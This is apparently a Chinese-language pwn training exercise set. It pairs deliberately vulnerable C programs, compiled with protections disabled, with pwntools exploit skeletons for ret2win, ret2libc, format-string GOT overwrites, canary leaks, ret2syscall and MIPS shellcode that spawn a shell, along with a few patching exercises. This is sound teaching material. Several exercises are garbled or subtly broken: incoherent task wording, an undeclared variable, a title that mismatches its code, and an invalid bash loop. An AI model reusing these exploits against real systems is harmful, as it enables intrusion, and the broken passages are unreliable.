# Pwn 練習題集（線上模組配用）

> 配套 Pwn 模組（P1~P8）。每題給：源碼、編譯命令、目標、解法提示、預估時間。
> 所有題目本地可重現；Flag 均為 `/flag`（本機自建）。

---

## 環境準備

```bash
sudo apt install -y build-essential gcc-multilib libc6-dev-i386 gdb
pip install pwntools ROPgadget
git clone https://github.com/pwndbg/pwndbg ~/pwndbg && bash ~/pwndbg/setup.sh
echo -n 'flag{pwn_local_pwned}' | sudo tee /flag >/dev/null
```

---

## 練習 26 · 第一個 ret2win（20 分鐘）

**challenge.c**

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void win() { system("cat /flag"); }

int main() {
    char buf[64];
    puts("Name: ");
    fflush(stdout);
    read(0, buf, 0x100);
    return 0;
}
```

```bash
gcc -fno-stack-protector -no-pie -z norelro challenge.c -o ch26
```

**目標**：ret addr → `win()`。
**提示**：buf=64；saved rbp=8 → ret offset 72。`win` 位址由 `objdump -d ch26 | grep win`。

**exploit 骨架**

```python
from pwn import *
p = process('./ch26')
p.sendlineafter(b'Name: ', b'A'*72 + p64(0x4011xx))
p.interactive()
```

---

## 練習 27 · checksec 實戰（10 分鐘）

```bash
for i 1 2 3; do echo "== $i =="; checksec ./ch$i; done
```

- 記錄 canary/PIE/RELRO，並講出「先 leak 還是先進來」。

---

## 練習 28 · pwntools 工具盒（20 分鐘）

```python
# cyclic 得 offset：
p = process('./ch26')
p.sendlineafter(b'Name: ', cyclic(0x200))
# crash == man? cyclyc -l 0x…  get offset
```

- 要求：用 pwntools 找出上面 ch26 的 ret offset（≈72）。


---

## 練習 29 · ret2libc 基礎 64-bit（30 分鐘）

**challenge.c**

```c
#include <stdio.h>
int main(){ setvbuf(stdout,NULL,_IONBF,0); setvbuf(stdin,NULL,_IONBF,0);
    char name[64];
    write(1, "Name: ", 6);
    read(0, name, 0x100);
    write(1, "Bye\n", 4);
    return 0;
}
```

**編譯**

```bash
gcc -fno-stack-protector -no-pie -z norelro challenge.c -o ch29
```

**exploit 步驟**

```python
POP_RDI = 0x00000000004011xx                  # ROPgadget
ROP_RET = 0x0000000000401xxa                  # 兩個 `ret` 對齊步
payload = flat('A'*72, POP_RDI, elf.got['puts'], elf.plt['puts'], elf.symbols['main'])
p.sendlineafter(b'Name: ', payload)          # leak puts@libc  
libc_base = leak - libc.symbols['puts']
payload2 = flat('A'*72, POP_RDI, next(libc.search(b'/bin/sh')), ROP_RET, libc_base + libc.symbols['system'])
p.sendlineafter(b'Name: ', payload2)
p.interactive()
```

**目標**：本地出 `sh`，`cat /flag`。

> 要求：不要用 one_gadget（那是下一題）。

---

## 練習 30 · one_gadget + 棧對齊（30 分鐘）

同 ch29；要求：

1. `one_gadget ./libc.so.6` 得編號（例 `0x50371`），
2. payload `flat('A'*72, base+0x50371)`；
3. 若走 movaps segfault → **在中間補一個 ret gadget**。

> 檢驗：出 shell 即通。

---

## 練習 31 · System V ABI 的 ecx jeoc（30 分）

- 一個 64-bit binary，一次 ROP call `system('/bin/sh')` 已完成；問「第二跳」能不能 to ret2csu。
- 只要求說出任務切換的理論；是否有 ret2csu 預設 gadget。

---

## 練習 32 · `system` evil `gets`（30 分鐘）

```c
#include <stdio.h>
int main() {
    gets(arr);
    printf("%s", arr);         // 完整受害人
    return 0;
}
```

- C 題：`gets` 無長度上限（直接覆蓋棧上的儲存區）。
- 要求：reengineer shellcode-less payload。

---

## 練習 33 · `strcat` + 未檢查 `sprintf`（30 分鐘）

```c
int main() {
    char txt[32], buf[32];
    gets(txt);
    strcpy(buf, txt);           // buffered – 開 32 bytes
}
```

要求：說出Bug 的小手把。

---

## 練習 34 · C 邏輯追蹤（30 分鐘）

```c
// binary（strip 頭可以）：標記的要 comment 在 Ghidra
```

- 學員 task：用 `objdump` + `ltrace` + `strace` 講出 5 條猜斷。
- 附 1 條 「我踩什麼陷阱」。

---

## 練習 35 · 格式化字串 leak lib（25 分鐘）

```c
#include <stdio.h>
int main() {
    char buf[64];
    read(0, buf, 64);
    printf(buf);          // 弱點
    printf("\n");
    return 0;
}
```

**編譯**

```bash
gcc -fno-stack-protector -no-pie -z norelro challenge.c -o ch35
```

- leak `puts@GOT` + printf 位址的 libc，
- 尋 `libc_base = leak - libc.symbols['puts']`
- 共通 `libc_base` 驗證。

---

## 練習 36 · 格式化字串寫 GOT（45 分鐘）

程式推到 add 32-bit no-pie 的 `printf` 位址，需要完整造寫入 payload：

```python
target = elf.got['printf']
value  = elf.plt['system']
pay    = fmtstr_payload(7, {target: value})    # offset 由 leak decide
p.sendline(pay)
p.sendline('/bin/sh')           # 往後的 printf → system
```

> 若 output 受 `~` limited，用「分兩次寫」。

---

## 練習 37 · Canary 的 leak（40 分鐘）

- binary 加 `-fstack-protector-all`。
- `puts` 讓人把 canary 部分 leak，
- leak → 保留 canary 剩7位；
- ret addr `win()`。
-  payload：

```python
pay = flat(b'A'*40, b'\n', FLAG_GOT_START, ...)
```

> 提示：`p.time` 帶 binary 直接有 Leak Buf。

---

## 練習 38 · mipsel first shellcode（40 分鐘）

```bash
sudo apt install -y gcc-mipsel-linux-gnu gdb-multiarch qemu-user-static
mipsel-linux-gnu-gcc -fno-stack-protector -no-pie challenge.c -o ch38
qemu-mipsel -L /usr/mipsel-linux-gnu ./ch38
```

- 習卷：手造的 execve shellcode（`$v0=4011`）執行 `/bin/sh`。

---

## 練習 39 · MIPS32 ROP（50 分鐘）

```bash
mipsel-linux-gnu-gcc -fno-stack-protector -no-pie challenge.c -o ch39
ROPgadget --binary ch39 --only "pop|jr|ret|jalr|lw"
```

- 任務：以 ret 位置以及 `$a0`, `$v0=4011` 的 Jump gadget 組 graph.

---

## 練習 40 · 純 ret2syscall(無 libc)（40 分鐘）

x86-64 binary,全套 `syscall` gadget，要求手拼 `execve`:

```python
pay = flat('A'*72, pop_rax, 59, pop_rdi, binsh, pop_rsi, 0, pop_rdx, 0, syscall)
```

---

## 練習 41 · printf**%n$** pattern（25 分鐘）

```c
printf(buf);    // 受 FORTIFY / `%i` 索引限制
```

指要求學員「Three**f**ormat 之 code pe中 **每% 先自身 call**」中 write $n.

---

## 練習 42 · patch 格式化字串（30 分鐘）

- 源碼：`printf(user)` → 修到 `printf("%s", user)`。
- 要求：不增加 ABI、功能變；重新編譯 + checksec 一致。

---

## 練習 43 · 最小權限 patch（40 分鐘）

- 程式在 `setuid(0)` 後運行丟 user；修正成「root 只作單一 enter」。

---

## 練習 44 · execve patch（40 分鐘）

```c
system("echo " + user);   // 改 execve
```

```c
char *args[] = {"/bin/echo", user, NULL};
execve(args[0], args, NULL);
```

---

## 練習 45 · AI 輔助逆向（自學）

```
把 Ghidra 導出的 C code 貼給 LLM：
```

> 使用 **`05-模板/AI提示詞庫.md`** 中的 prompt N5。

---

## 附錄 · 一覽表

| 練習 | 難度 | 時間 | 對應章節 |
|---|---|---|---|
| 26 | ★ | 20m | P1 |
| 27 | ★ | 10m | P2 |
| 28 | ★ | 20m | P3 |
| 29 | ★★★ | 30m | P4 |
| 30 | ★★★ | 30m | P4 |
| 31 | ★★★ | 30m | P4 |
| 32/33 | ★★ | 60m | P1 |
| 34 | ★★ | 30m | P5 |
| 35/36 | ★★★ | 70m | P6 |
| 37 | ★★★ | 40m | P6 |
| 38 | ★★★ | 40m | P7 |
| 39 | ★★★★ | 50m | P7 |
| 40 | ★★★ | 40m | P4 |
| 41 | ★★ | 25m | P6 |
| 42/43/44 | ★★ | 110m | P8 |
| 45 | ★★ | 自學 | P8 |
